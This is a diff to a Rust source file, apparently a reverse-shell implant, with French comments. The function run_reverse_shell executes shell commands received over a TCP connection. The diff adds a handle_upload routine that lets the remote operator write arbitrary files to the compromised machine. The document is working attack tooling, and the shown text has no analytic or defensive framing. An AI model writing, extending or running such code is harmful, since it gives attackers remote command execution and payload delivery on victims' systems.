@@ -2,6 +2,7 @@ use std::process::{Command, Stdio};
 use std::env;
 use std::net::TcpStream;
 use std::io::{Read, Write};
+use std::fs::File;
 
 pub fn run_reverse_shell() {
     let args: Vec<String> = env::args().collect();
@@ -23,8 +24,14 @@ pub fn run_reverse_shell() {
             match stream.read(&mut buffer) {
                 Ok(size) if size > 0 => {
                     let command = String::from_utf8_lossy(&buffer[..size]);
-                    let output = execute_command(command.trim(), shell_type);
-                    let _ = stream.write(output.as_bytes());
+                    if command.starts_with("UPLOAD ") {
+                        if let Err(e) = handle_upload(&mut stream, command.trim()) {
+                            let _ = stream.write(format!("Error handling upload: {}\n", e).as_bytes());
+                        }
+                    } else {
+                        let output = execute_command(command.trim(), shell_type);
+                        let _ = stream.write(output.as_bytes());
+                    }
                 }
                 _ => break,
             }
@@ -75,4 +82,32 @@ fn execute_bash_command(command: &str) -> String {
         }
         Err(e) => format!("Error executing Bash command: {}\n", e),
     }
+}
+
+fn handle_upload(stream: &mut TcpStream, command: &str) -> std::io::Result<()> {
+    let parts: Vec<&str> = command.splitn(3, ' ').collect();
+    if parts.len() != 3 {
+        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid UPLOAD command"));
+    }
+
+    let remote_file = parts[1];
+    let file_size: usize = parts[2].parse().map_err(|_| {
+        std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid file size in UPLOAD command")
+    })?;
+
+    // Informer le listener qu'on est prêt à recevoir les données
+    stream.write_all(b"READY\n")?;
+
+    // Lire les données du fichier
+    let mut file_data = vec![0; file_size];
+    stream.read_exact(&mut file_data)?;
+
+    // Écrire les données dans un fichier local
+    let mut file = File::create(remote_file)?;
+    file.write_all(&file_data)?;
+
+    println!("File '{}' uploaded successfully", remote_file);
+    stream.write_all(b"UPLOAD complete\n")?;
+
+    Ok(())
 }
